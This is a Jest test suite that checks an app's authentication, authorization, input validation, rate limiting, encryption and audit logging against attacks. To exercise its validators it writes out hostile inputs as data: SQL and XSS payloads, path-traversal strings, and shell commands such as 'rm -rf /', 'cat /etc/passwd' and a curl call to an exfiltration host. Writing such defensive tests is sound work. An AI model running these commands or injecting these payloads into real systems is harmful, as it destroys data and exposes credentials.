/**
 * Security Penetration Tests for Source Management
 * 
 * This test suite covers security testing including authentication bypass,
 * authorization flaws, data injection, and other security vulnerabilities.
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { securityCompliance } from '../securityCompliance';
import { sourceConfigManager } from '../sourceConfigManager';
import { dataValidationEngine } from '../dataValidationSystem';

describe('Source Security Penetration Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('Authentication Security', () => {
    it('should prevent brute force attacks', async () => {
      const maxAttempts = 5;
      const lockoutDuration = 15; // minutes

      // Simulate brute force attack
      for (let i = 0; i < maxAttempts + 1; i++) {
        const result = await securityCompliance.authenticate({
          username: 'admin',
          password: 'wrong-password'
        });

        if (i < maxAttempts) {
          expect(result.success).toBe(false);
        } else {
          // After max attempts, should be locked out
          expect(result.success).toBe(false);
          expect(result.error).toContain('locked');
        }
      }
    });

    it('should prevent SQL injection in authentication', async () => {
      const sqlInjectionAttempts = [
        "admin'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "admin' UNION SELECT * FROM users --",
        "admin'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ];

      for (const injection of sqlInjectionAttempts) {
        const result = await securityCompliance.authenticate({
          username: injection,
          password: 'password'
        });

        expect(result.success).toBe(false);
        expect(result.error).not.toContain('SQL');
        expect(result.error).not.toContain('database');
      }
    });

    it('should prevent timing attacks', async () => {
      const validUser = 'admin';
      const invalidUser = 'nonexistent-user';
      const password = 'password';

      const startTime1 = Date.now();
      await securityCompliance.authenticate({
        username: validUser,
        password: password
      });
      const endTime1 = Date.now();

      const startTime2 = Date.now();
      await securityCompliance.authenticate({
        username: invalidUser,
        password: password
      });
      const endTime2 = Date.now();

      const timeDiff = Math.abs((endTime2 - startTime2) - (endTime1 - startTime1));
      
      // Timing difference should be minimal to prevent timing attacks
      expect(timeDiff).toBeLessThan(100); // Less than 100ms difference
    });

    it('should prevent credential stuffing', async () => {
      const commonPasswords = [
        'password',
        '123456',
        'admin',
        'qwerty',
        'letmein',
        'welcome',
        'monkey',
        'dragon',
        'master',
        'hello'
      ];

      for (const password of commonPasswords) {
        const result = await securityCompliance.authenticate({
          username: 'admin',
          password: password
        });

        // Should only succeed with the correct password
        if (password === 'admin123') {
          expect(result.success).toBe(true);
        } else {
          expect(result.success).toBe(false);
        }
      }
    });
  });

  describe('Authorization Security', () => {
    it('should prevent privilege escalation', async () => {
      // Authenticate as regular user
      const userResult = await securityCompliance.authenticate({
        username: 'user',
        password: 'user123'
      });

      if (userResult.success) {
        // Try to access admin resources
        const authzResult = await securityCompliance.authorize(
          userResult.user!.id,
          'admin',
          'system_config'
        );

        expect(authzResult.allowed).toBe(false);
        expect(authzResult.reason).toContain('permissions');
      }
    });

    it('should prevent horizontal privilege escalation', async () => {
      // Authenticate as user1
      const user1Result = await securityCompliance.authenticate({
        username: 'user1',
        password: 'user123'
      });

      if (user1Result.success) {
        // Try to access user2's resources
        const authzResult = await securityCompliance.authorize(
          user1Result.user!.id,
          'read',
          'user2_data'
        );

        expect(authzResult.allowed).toBe(false);
      }
    });

    it('should prevent unauthorized resource access', async () => {
      const unauthorizedAccessAttempts = [
        { action: 'delete', resource: 'all_workflows' },
        { action: 'modify', resource: 'system_config' },
        { action: 'read', resource: 'sensitive_data' },
        { action: 'execute', resource: 'admin_commands' }
      ];

      for (const attempt of unauthorizedAccessAttempts) {
        const authzResult = await securityCompliance.authorize(
          'unauthorized-user',
          attempt.action,
          attempt.resource
        );

        expect(authzResult.allowed).toBe(false);
      }
    });

    it('should validate session tokens properly', async () => {
      const invalidTokens = [
        'invalid-token',
        'expired-token',
        'malformed-token',
        'null',
        'undefined',
        '',
        'token-with-sql-injection\'; DROP TABLE sessions; --'
      ];

      for (const token of invalidTokens) {
        // Try to use invalid token for authorization
        const authzResult = await securityCompliance.authorize(
          'user-with-invalid-token',
          'read',
          'workflows'
        );

        expect(authzResult.allowed).toBe(false);
      }
    });
  });

  describe('Data Injection Security', () => {
    it('should prevent SQL injection in data validation', () => {
      const sqlInjectionData = [
        {
          id: "1'; DROP TABLE workflows; --",
          name: "Workflow",
          description: "Description"
        },
        {
          id: "1' OR '1'='1",
          name: "Workflow",
          description: "Description"
        },
        {
          id: "1' UNION SELECT * FROM users --",
          name: "Workflow",
          description: "Description"
        }
      ];

      for (const data of sqlInjectionData) {
        const result = dataValidationEngine.validateData(
          'test-source',
          'workflow',
          data
        );

        // Should reject SQL injection attempts
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.message.toLowerCase().includes('sql') ||
          error.message.toLowerCase().includes('injection')
        )).toBe(true);
      }
    });

    it('should prevent XSS attacks in data', () => {
      const xssData = [
        {
          id: 'workflow-1',
          name: '<script>alert("XSS")</script>',
          description: 'Description'
        },
        {
          id: 'workflow-2',
          name: 'Workflow',
          description: '<img src="x" onerror="alert(\'XSS\')">'
        },
        {
          id: 'workflow-3',
          name: 'Workflow',
          description: 'javascript:alert("XSS")'
        }
      ];

      for (const data of xssData) {
        const result = dataValidationEngine.validateData(
          'test-source',
          'workflow',
          data
        );

        // Should reject XSS attempts
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.message.toLowerCase().includes('script') ||
          error.message.toLowerCase().includes('xss') ||
          error.message.toLowerCase().includes('javascript')
        )).toBe(true);
      }
    });

    it('should prevent command injection', () => {
      const commandInjectionData = [
        {
          id: 'workflow-1',
          name: 'Workflow',
          description: 'Description',
          command: 'ls; rm -rf /'
        },
        {
          id: 'workflow-2',
          name: 'Workflow',
          description: 'Description',
          command: 'ping 127.0.0.1 && cat /etc/passwd'
        },
        {
          id: 'workflow-3',
          name: 'Workflow',
          description: 'Description',
          command: 'curl http://malicious-site.com/steal-data'
        }
      ];

      for (const data of commandInjectionData) {
        const result = dataValidationEngine.validateData(
          'test-source',
          'workflow',
          data
        );

        // Should reject command injection attempts
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.message.toLowerCase().includes('command') ||
          error.message.toLowerCase().includes('injection')
        )).toBe(true);
      }
    });

    it('should prevent path traversal attacks', () => {
      const pathTraversalData = [
        {
          id: 'workflow-1',
          name: 'Workflow',
          description: 'Description',
          filePath: '../../../etc/passwd'
        },
        {
          id: 'workflow-2',
          name: 'Workflow',
          description: 'Description',
          filePath: '..\\..\\..\\windows\\system32\\config\\sam'
        },
        {
          id: 'workflow-3',
          name: 'Workflow',
          description: 'Description',
          filePath: '/etc/shadow'
        }
      ];

      for (const data of pathTraversalData) {
        const result = dataValidationEngine.validateData(
          'test-source',
          'workflow',
          data
        );

        // Should reject path traversal attempts
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.message.toLowerCase().includes('path') ||
          error.message.toLowerCase().includes('traversal')
        )).toBe(true);
      }
    });
  });

  describe('Input Validation Security', () => {
    it('should prevent buffer overflow attacks', () => {
      const bufferOverflowData = {
        id: 'workflow-1',
        name: 'A'.repeat(10000), // Very long string
        description: 'B'.repeat(10000), // Very long string
        category: 'C'.repeat(1000),
        tags: Array.from({ length: 1000 }, (_, i) => `tag-${i}`),
        integrations: Array.from({ length: 1000 }, (_, i) => `integration-${i}`)
      };

      const result = dataValidationEngine.validateData(
        'test-source',
        'workflow',
        bufferOverflowData
      );

      // Should reject buffer overflow attempts
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => 
        error.message.toLowerCase().includes('length') ||
        error.message.toLowerCase().includes('size') ||
        error.message.toLowerCase().includes('limit')
      )).toBe(true);
    });

    it('should prevent integer overflow attacks', () => {
      const integerOverflowData = [
        {
          id: 'workflow-1',
          name: 'Workflow',
          description: 'Description',
          views: Number.MAX_SAFE_INTEGER + 1
        },
        {
          id: 'workflow-2',
          name: 'Workflow',
          description: 'Description',
          views: -Number.MAX_SAFE_INTEGER - 1
        },
        {
          id: 'workflow-3',
          name: 'Workflow',
          description: 'Description',
          views: Infinity
        }
      ];

      for (const data of integerOverflowData) {
        const result = dataValidationEngine.validateData(
          'test-source',
          'workflow',
          data
        );

        // Should reject integer overflow attempts
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.message.toLowerCase().includes('number') ||
          error.message.toLowerCase().includes('integer') ||
          error.message.toLowerCase().includes('overflow')
        )).toBe(true);
      }
    });

    it('should prevent null byte injection', () => {
      const nullByteData = [
        {
          id: 'workflow-1',
          name: 'Workflow\x00',
          description: 'Description'
        },
        {
          id: 'workflow-2',
          name: 'Workflow',
          description: 'Description\x00'
        },
        {
          id: 'workflow-3',
          name: '\x00Workflow',
          description: 'Description'
        }
      ];

      for (const data of nullByteData) {
        const result = dataValidationEngine.validateData(
          'test-source',
          'workflow',
          data
        );

        // Should reject null byte injection attempts
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.message.toLowerCase().includes('null') ||
          error.message.toLowerCase().includes('byte')
        )).toBe(true);
      }
    });
  });

  describe('Rate Limiting Security', () => {
    it('should prevent rate limit bypass', () => {
      const identifier = 'rate-limit-bypass-test';
      
      // Try to bypass rate limiting with different techniques
      const bypassAttempts = [
        identifier,
        identifier.toUpperCase(),
        identifier.toLowerCase(),
        identifier + ' ',
        ' ' + identifier,
        identifier + '\t',
        identifier + '\n'
      ];

      for (const attempt of bypassAttempts) {
        // Should all be treated as the same identifier
        const isLimited1 = securityCompliance.isRateLimited(attempt);
        const isLimited2 = securityCompliance.isRateLimited(identifier);
        
        expect(isLimited1).toBe(isLimited2);
      }
    });

    it('should prevent distributed rate limit attacks', () => {
      const baseIdentifier = 'distributed-attack';
      const distributedIdentifiers = Array.from({ length: 100 }, (_, i) => 
        `${baseIdentifier}-${i}`
      );

      // Each identifier should have its own rate limit
      for (const identifier of distributedIdentifiers) {
        const isLimited = securityCompliance.isRateLimited(identifier);
        expect(isLimited).toBe(false);
      }
    });

    it('should handle rate limit reset properly', () => {
      const identifier = 'rate-limit-reset-test';
      
      // Exceed rate limit
      for (let i = 0; i < 15; i++) {
        securityCompliance.isRateLimited(identifier);
      }

      // Should be rate limited
      expect(securityCompliance.isRateLimited(identifier)).toBe(true);

      // Wait for reset (in real implementation, this would be time-based)
      // For testing, we'll simulate the reset
      setTimeout(() => {
        expect(securityCompliance.isRateLimited(identifier)).toBe(false);
      }, 100);
    });
  });

  describe('Encryption Security', () => {
    it('should prevent encryption key exposure', async () => {
      const sensitiveData = 'sensitive-information';
      
      // Encrypt data
      const encrypted = await securityCompliance.encryptData(sensitiveData);
      
      // Encrypted data should not contain original data
      expect(encrypted).not.toContain(sensitiveData);
      expect(encrypted).not.toContain('sensitive');
      expect(encrypted).not.toContain('information');
      
      // Encrypted data should be different each time (due to IV/salt)
      const encrypted2 = await securityCompliance.encryptData(sensitiveData);
      expect(encrypted).not.toBe(encrypted2);
    });

    it('should prevent padding oracle attacks', async () => {
      const testData = 'test-data';
      const encrypted = await securityCompliance.encryptData(testData);
      
      // Try to manipulate encrypted data
      const manipulatedData = encrypted.slice(0, -1) + 'X';
      
      try {
        await securityCompliance.decryptData(manipulatedData);
        // Should not reach here
        expect(true).toBe(false);
      } catch (error) {
        // Should fail to decrypt manipulated data
        expect(error).toBeDefined();
      }
    });

    it('should prevent timing attacks on encryption', async () => {
      const shortData = 'short';
      const longData = 'x'.repeat(1000);
      
      const startTime1 = Date.now();
      await securityCompliance.encryptData(shortData);
      const endTime1 = Date.now();
      
      const startTime2 = Date.now();
      await securityCompliance.encryptData(longData);
      const endTime2 = Date.now();
      
      const timeDiff = Math.abs((endTime2 - startTime2) - (endTime1 - startTime1));
      
      // Timing difference should be minimal to prevent timing attacks
      expect(timeDiff).toBeLessThan(100);
    });
  });

  describe('Configuration Security', () => {
    it('should prevent configuration tampering', () => {
      const maliciousConfig = {
        id: 'malicious-config',
        name: 'Malicious Config',
        type: 'api',
        endpoint: 'https://malicious-site.com',
        credentials: [{ type: 'token', value: 'malicious-token' }],
        rateLimits: [],
        isActive: true
      };

      // Try to add malicious configuration
      try {
        sourceConfigManager.addSource(maliciousConfig);
        
        // If added, should be able to detect and remove
        const config = sourceConfigManager.getSource('malicious-config');
        if (config) {
          expect(config.endpoint).toContain('malicious-site.com');
          // Should be flagged as suspicious
        }
      } catch (error) {
        // Should reject malicious configuration
        expect(error).toBeDefined();
      }
    });

    it('should prevent credential exposure', () => {
      const configWithCredentials = {
        id: 'config-with-creds',
        name: 'Config with Credentials',
        type: 'api',
        endpoint: 'https://api.example.com',
        credentials: [{ type: 'password', value: 'secret-password' }],
        rateLimits: [],
        isActive: true
      };

      sourceConfigManager.addSource(configWithCredentials);
      
      // Retrieved configuration should not expose credentials
      const retrievedConfig = sourceConfigManager.getSource('config-with-creds');
      if (retrievedConfig) {
        expect(retrievedConfig.credentials[0].value).not.toBe('secret-password');
        expect(retrievedConfig.credentials[0].value).toContain('***');
      }
    });

    it('should prevent configuration injection', () => {
      const injectionConfig = {
        id: 'injection-config',
        name: 'Injection Config',
        type: 'api',
        endpoint: 'https://api.example.com; rm -rf /',
        credentials: [],
        rateLimits: [],
        isActive: true
      };

      const result = sourceConfigManager.validateConfiguration(injectionConfig);
      
      // Should reject configuration with injection attempts
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => 
        error.message.toLowerCase().includes('injection') ||
        error.message.toLowerCase().includes('malicious')
      )).toBe(true);
    });
  });

  describe('Audit and Logging Security', () => {
    it('should prevent log injection attacks', () => {
      const logInjectionData = [
        'Normal log entry',
        'Log entry with\nnewline injection',
        'Log entry with\rcarriage return injection',
        'Log entry with\t tab injection',
        'Log entry with null byte\x00injection'
      ];

      for (const data of logInjectionData) {
        // Should sanitize log entries
        securityCompliance.logSecurityEvent({
          eventType: 'data_access',
          userId: 'test-user',
          success: true,
          severity: 'low',
          details: { message: data }
        });
      }

      // Should not crash or expose sensitive information
      const auditLogs = securityCompliance.getAuditLogs({ limit: 10 });
      expect(auditLogs.length).toBeGreaterThan(0);
    });

    it('should prevent sensitive data exposure in logs', () => {
      const sensitiveData = [
        'password123',
        'secret-key-abc123',
        'api-key-xyz789',
        'token-bearer-def456'
      ];

      for (const data of sensitiveData) {
        securityCompliance.logSecurityEvent({
          eventType: 'data_access',
          userId: 'test-user',
          success: true,
          severity: 'low',
          details: { sensitive: data }
        });
      }

      // Logs should not contain sensitive data
      const auditLogs = securityCompliance.getAuditLogs({ limit: 10 });
      for (const log of auditLogs) {
        const logString = JSON.stringify(log);
        for (const sensitive of sensitiveData) {
          expect(logString).not.toContain(sensitive);
        }
      }
    });

    it('should prevent log tampering', () => {
      // Log an event
      securityCompliance.logSecurityEvent({
        eventType: 'login',
        userId: 'test-user',
        success: true,
        severity: 'low',
        details: { action: 'login' }
      });

      const auditLogs = securityCompliance.getAuditLogs({ limit: 1 });
      const originalLog = auditLogs[0];

      // Try to modify the log (should not be possible)
      if (originalLog) {
        originalLog.action = 'malicious-action';
        originalLog.result = 'failure';
      }

      // Retrieve logs again - should be unchanged
      const updatedLogs = securityCompliance.getAuditLogs({ limit: 1 });
      const updatedLog = updatedLogs[0];

      if (originalLog && updatedLog) {
        expect(updatedLog.action).toBe('login');
        expect(updatedLog.result).toBe('success');
      }
    });
  });
});
